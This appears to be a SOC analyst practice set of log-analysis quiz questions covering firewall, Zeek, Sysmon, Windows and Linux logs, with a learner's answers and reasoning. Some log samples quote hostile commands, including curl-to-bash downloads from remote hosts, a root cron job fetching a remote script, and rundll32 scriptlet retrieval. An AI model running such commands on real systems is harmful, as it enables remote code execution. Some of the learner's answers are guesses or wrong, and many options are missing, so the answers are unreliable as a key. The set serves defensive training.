title: Technical Log Analysis Practice Set
summary: 30 hard technical CySA+ / SOC analyst log questions focused on firewall logs, Zeek, Suricata, Sysmon, Windows event logs, Linux auth/audit logs, NetFlow, TLS, DNS, and Kerberos.

questions.question:
Evaluate the following Linux firewall log:

Jan 14 03:21:44 web1 kernel: iptables INPUT DROP IN=eth0 OUT= MAC=00:0c:29:aa:bb:cc:00:50:56:dd:ee:ff:08:00 SRC=172.16.4.25 DST=172.16.4.10 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=43121 DF PROTO=TCP SPT=49222 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0

Which of the following statements is TRUE?
options: The host blocked an inbound SSH connection attempt
The host allowed an outbound SSH connection attempt
The packet was dropped because DNS filtering blocked it
The packet represents an established SSH session
questions.myAnswer: A, because of "INPUT DROP" that means failed, but i don't see any evidence for DNS filtering blocking packet

questions.question:
Evaluate the following Linux firewall log:

Feb 02 11:18:03 lx-fw kernel: iptables OUTPUT DROP IN= OUT=eth0 SRC=10.8.1.44 DST=198.51.100.22 LEN=52 TOS=0x00 PREC=0x00 TTL=64 ID=22017 DF PROTO=TCP SPT=49812 DPT=4444 WINDOW=29200 RES=0x00 SYN URGP=0

What does this log MOST likely indicate?
options: An inbound packet to port 4444 was dropped
An outbound TCP connection attempt to port 4444 was blocked
A UDP DNS query was blocked
A successful reverse shell was established
questions.myAnswer: B, destination is public ip and src is private, meaning outbound connection, destination port is 4444, and there is only SYN, no ACK in handshake

questions.question:
A firewall log contains the following:

PROTO=TCP SPT=3389 DPT=51532 SYN ACK

Which statement is MOST accurate?
options: The source host is initiating an RDP connection
The source host is responding from RDP to a client ephemeral port
The destination host is listening on port 3389
The packet is UDP traffic from an RDP server
questions.myAnswer: A, because port 3389 is RDP

questions.question:
Evaluate the following log:

Jun 18 09:45:12 fw01 kernel: DROP IN=eth1 OUT= MAC=... SRC=203.0.113.77 DST=10.0.2.15 PROTO=TCP SPT=56123 DPT=25 SYN

Which service was the external host attempting to reach?
questions.myAnswer: C, because 25 is SMPT port

questions.question:
A packet log shows:

SRC=10.10.5.20 DST=10.10.5.1 PROTO=UDP SPT=68 DPT=67

Which activity is MOST likely occurring?
options: DHCP client request to DHCP server
questions.myAnswer: A, because 68 is DHCP client and 67 is DHCP server ports

questions.question:
A packet log shows:

SRC=10.10.5.1 DST=10.10.5.20 PROTO=UDP SPT=67 DPT=68

Which activity is MOST likely occurring?
questions.myAnswer: A, because its same as 5th question just in reverse.

questions.question:
A Zeek dns.log entry contains:

query: aHR0cHM6Ly9leGZpbC5leGFtcGxl.com
qtype_name: TXT
answers: <none>
uid: C8a9k11

Why is this suspicious?
options: TXT records can be used to transfer encoded data through DNS
The query proves ARP spoofing occurred
DNS TXT queries only occur during DHCP negotiation
questions.myAnswer: Not sure on this one but i guess A, because it makes more sense compared to other ones (hesitating with D too)

questions.question:
A Zeek conn.log entry shows:

id.orig_h=10.2.3.44 id.resp_h=198.51.100.80 id.resp_p=443 proto=tcp service=ssl duration=0.15 orig_bytes=85 resp_bytes=120 history=S

What does the history value MOST likely indicate?
options: A complete TLS session with data transfer
A connection attempt with SYN but no full establishment
questions.myAnswer: B, because history=S means packet was seen but connection never finished

questions.question:
A Zeek conn.log entry shows:

id.orig_h=10.0.4.15 id.resp_h=203.0.113.9 id.resp_p=80 proto=tcp service=http history=ShADadF

Which interpretation is BEST?
options: The connection likely completed a normal TCP handshake and exchanged data
The connection only sent a SYN and nothing else
questions.myAnswer: A, because in zeek conn.log documentation i saw that in "history" value "ShADadF" - "D" means that originator sent at least one segment with payload data, so its normal TCP handshake + some data

questions.question:
A Suricata alert shows:

alert http any any -> any any (msg:"ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT"; content:"UNION"; http_uri; content:"SELECT"; http_uri; sid:100001;)

Which log field would BEST validate whether the payload was in the requested URL?
questions.myAnswer: I guess B but skipping for now

questions.question:
A web server log shows:

192.0.2.55 - - [12/May/2026:04:44:10 +0000] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 1803

What attack is MOST likely being attempted?
questions.myAnswer: B, because of directory specifications

questions.question:
A web server log shows:

198.51.100.23 - - "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200

Which vulnerability is MOST likely being tested?
questions.myAnswer: A, because of <script> tag

questions.question:
A Windows Security log shows:

Event ID: 4624
Logon Type: 3
Account Name: svc_app
Source Network Address: 10.0.8.55

What does Logon Type 3 generally indicate?
questions.myAnswer: Not sure, guessing B?

questions.question:
A Windows Security log shows:

Event ID: 4624
Logon Type: 10
Account Name: admin01
Source Network Address: 10.0.9.21

What does Logon Type 10 generally indicate?
questions.myAnswer: Not sure, guessing B

questions.question:
A Windows Security log shows:

Event ID: 4672
SubjectUserName: backup_svc
Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeBackupPrivilege

Why is this event important during triage?
options: It shows DNS tunneling was successful
It indicates special privileges were assigned to the logon session
It confirms the account password was changed
It proves the host was patched
questions.myAnswer: B, because 4672 means succesfull privilege upgrade or something similar

questions.question:
A Windows event shows:

Event ID: 7045
Service Name: WinUpdateCheck
Service File Name: C:\\Users\\Public\\updater.exe
Service Type: user mode service
Start Type: auto start

What does this MOST likely indicate?
options: Possible persistence through new service creation
questions.myAnswer: I guess A

questions.question:
A Windows Security log shows:

Event ID: 4688
New Process Name: C:\\Windows\\System32\\rundll32.exe
Command Line: rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://198.51.100.99/a.sct")

Which technique is MOST likely being used?
questions.myAnswer: Guessing A

questions.question:
A Sysmon Event ID 1 shows:

Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand SQBFAFgA...

Which field provides the strongest evidence of malicious parent-child process behavior?
questions.myAnswer: B

questions.question:
A Sysmon Event ID 3 shows:

Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
DestinationIp: 203.0.113.77
DestinationPort: 443
Initiated: true

Which interpretation is BEST?
options: PowerShell initiated an outbound HTTPS connection
PowerShell received an inbound DNS request
A firewall blocked all outbound traffic
questions.myAnswer: A, because its outbound traffic on HTTPS port

questions.question:
A Linux auth.log shows:

May 21 02:13:10 server sshd[2218]: Failed password for invalid user admin from 203.0.113.50 port 51122 ssh2
May 21 02:13:12 server sshd[2220]: Failed password for invalid user test from 203.0.113.50 port 51124 ssh2
May 21 02:13:15 server sshd[2222]: Failed password for invalid user oracle from 203.0.113.50 port 51126 ssh2

Which activity is MOST likely occurring?
questions.myAnswer: A

questions.question:
A Linux auth.log shows:

sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash

What does this event show?
options: deploy executed a root shell through sudo
questions.myAnswer: B, because of "sudo: deploy" command and then "USER=root" and "COMMAND=/bin/bash"

questions.question:
An auditd log shows:

type=SYSCALL msg=audit(1716300400.123:411): arch=c000003e syscall=59 success=yes exe="/usr/bin/bash" comm="bash"
type=EXECVE msg=audit(1716300400.123:411): argc=3 a0="bash" a1="-c" a2="curl http://203.0.113.8/p.sh | bash"

Which risk is MOST evident?
options: Normal package update using signed repo only
questions.myAnswer: Not sure, maybe D, because there is firstly execution and only then curl

questions.question:
A cron file is discovered:

* * * * * root curl -s http://198.51.100.44/checkin.sh | bash

Why is this suspicious?
options: It executes a remote script every minute as root
It only changes the system time
questions.myAnswer: A seems like correct answer but i would have only guessed it, not explained (mark as incorrect)

questions.question:
An nginx access log shows:

10.1.2.8 - - "POST /api/login HTTP/1.1" 401
10.1.2.8 - - "POST /api/login HTTP/1.1" 401
10.1.2.8 - - "POST /api/login HTTP/1.1" 200

Which interpretation is BEST?
options: Failed authentication attempts followed by successful authentication
questions.myAnswer: A

questions.question:
An HTTP log shows:

GET /admin HTTP/1.1" 302
GET /login HTTP/1.1" 200

What does the 302 response MOST likely indicate?
options: The user was redirected, likely to login
The server returned a forbidden response
The request caused a DNS failure
The request successfully deleted a file
questions.myAnswer: A

questions.question:
A NetFlow record shows:

src=10.5.4.20 dst=203.0.113.88 dst_port=443 bytes_out=985432100 bytes_in=18210 duration=4200

Which activity should be investigated FIRST?
questions.myAnswer: A, because its outbound connection from local to public ip on https port with huge amounts of bytes going out

questions.question:
A TLS log shows:

sni=cdn-update-security.com ja3=72a589da586844d7f0818ce684948eea subject=CN=cdn-update-security.com issuer=Let's Encrypt not_before=2026-05-21

Why is this suspicious in a malware investigation?
options: Recently issued certificate and suspicious update-themed domain may indicate new C2 infrastructure
Let’s Encrypt certificates are always malicious
JA3 hashes are only used for DHCP
questions.myAnswer: I think A, but lets mark it as partly correct because im not good at TLS logs yet

questions.question:
A DNS log shows:

query=_ldap._tcp.dc._msdcs.corp.local type=SRV src=10.0.3.55

What is the MOST likely purpose of this query?
options: Domain controller/service discovery in Active Directory
questions.myAnswer: A, because of "ldap" which means lightweight directory access protocol

questions.question:
A Windows Security log shows:

Event ID: 4768
Account Name: user1
Failure Code: 0x18
Client Address: 10.0.4.81

What does repeated 4768 failure code 0x18 MOST commonly suggest?
options: Kerberos pre-authentication failure, often bad password attempts
questions.myAnswer: Mark this as incorrect, i don't know the answer

questions.question:
A Windows Security log shows:

Event ID: 4769
Service Name: MSSQLSvc/db01.corp.local:1433
Ticket Encryption Type: 0x17
Account Name: normal.user

Why might this be suspicious during threat hunting?
options: RC4-encrypted service tickets may be relevant to Kerberoasting investigations
It confirms the server was physically stolen
questions.myAnswer: Same as previous, mark incorrect
